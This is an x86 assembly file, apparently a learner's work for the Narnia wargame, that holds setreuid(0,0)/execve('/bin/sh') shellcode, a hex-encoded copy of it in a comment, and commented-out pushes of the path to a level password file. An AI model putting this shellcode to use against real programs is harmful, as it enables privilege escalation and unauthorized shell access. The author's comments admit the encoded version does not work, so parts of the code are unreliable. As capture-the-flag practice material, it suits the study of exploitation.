#TODO: this shellcode get not work for narnia1
#\x31\xc0\xb8\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb8\x0b\xcd\x80"
#also might because the shellcode is wrong, as assembly code works, I can get shell but, shellcode run in C not work
.section .text
.global main
main:
    #setreuid(0,0)
    xor %eax, %eax
    mov $0x46, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx
    int $0x80

    #execve("/bin/sh", ["/bin/sh", "0"], null)
    xor %eax, %eax
    push %eax
    #//sh
    push $0x68732f2f
    #/bin
    push $0x6e69622f

    #TODO:I don't know how to pad "cat", as it pad "/sh" with "/" but this don't work for "cat"
    # I think cat is called by "bin/cat"

    #/etc/narnia_pass/narnia3
    #push $0x3361696E
    #push $0x72616E2F
    #push $0x73736170
    #push $0x5F61696E
    #push $0x72616E2F
    #push $0x6374652F


    mov %esp, %ebx
    push %eax
    push %ebx
    mov %esp, %ecx
    xor %edx, %edx

    mov $0xb, %eax
    int $0x80
